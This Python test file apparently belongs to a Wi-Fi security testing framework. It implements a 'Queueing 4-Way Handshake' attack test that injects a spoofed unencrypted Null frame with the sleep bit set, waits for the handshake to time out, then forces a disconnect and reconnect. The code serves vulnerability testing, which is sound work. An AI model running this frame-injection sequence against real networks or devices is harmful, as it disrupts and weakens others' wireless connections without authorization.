import time
from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test


class Queue4WHReconnect(Test):
    """
    Queueing 4-Way Handshake Attack with reconnect logic.
    Connect → immediately inject sleep Null-frame → wait handshake timeout →
    disconnect → reconnect → finish.
    """

    name = "queue-4wh-reconnect"
    kind = Test.Supplicant

    def __init__(self):
        super().__init__([
            # First connection → perform attack
            Action(trigger=Trigger.Connected, action=Action.Function),

            # After forced disconnect → reconnect
            Action(trigger=Trigger.Disconnected, action=Action.Function),

            # Second connection → test done
            Action(trigger=Trigger.Connected, action=Action.Function),
        ])

    # ----------------------------------------------------------------------
    # STEP 1: First connection → perform attack immediately
    # ----------------------------------------------------------------------

    def after_first_connect(self, station):
        log(STATUS, "Connected. Executing Queue‑4WH attack sequence...")

        # Build NULL frame with sleep-bit
        null = station.get_header()
        null.type = 2      # Data
        null.subtype = 4   # Null frame
        null.FCfield |= 0x10   # Power management bit = sleep

        log(STATUS, "Injecting spoofed Null-frame (sleep-bit)...")
        station.inject(null, mon=True, encrypt=False)

        # Wait for handshake timeout
        log(STATUS, "Waiting 3 seconds for handshake timeout...")
        time.sleep(3)

        # Force disconnect to complete Stage 3 of attack
        log(STATUS, "Forcing DISCONNECT...")
        station.wpaspy_command("DISCONNECT")

    # ----------------------------------------------------------------------
    # STEP 2: After first disconnection → reconnect
    # ----------------------------------------------------------------------

    def after_disconnect(self, station):
        log(STATUS, "Disconnected. Waiting before RECONNECT...")
        time.sleep(3)
        log(STATUS, "Sending RECONNECT command...")
        station.wpaspy_command("RECONNECT")

    # ----------------------------------------------------------------------
    # STEP 3: Second connection → attack complete
    # ----------------------------------------------------------------------

    def after_second_connect(self, station):
        log(STATUS, "Reconnected successfully after attack!")
        time.sleep(1)
        log(SUCCESS, "Queue‑4WH attack test completed successfully.")
        self.terminate()

    # ----------------------------------------------------------------------

    def generate(self, station):
        # Assign internal functions to actions
        self.actions[0].set_function(self.after_first_connect)
        self.actions[1].set_function(self.after_disconnect)
        self.actions[2].set_function(self.after_second_connect)

        log(STATUS, "Queue‑4WH reconnect test ready.")
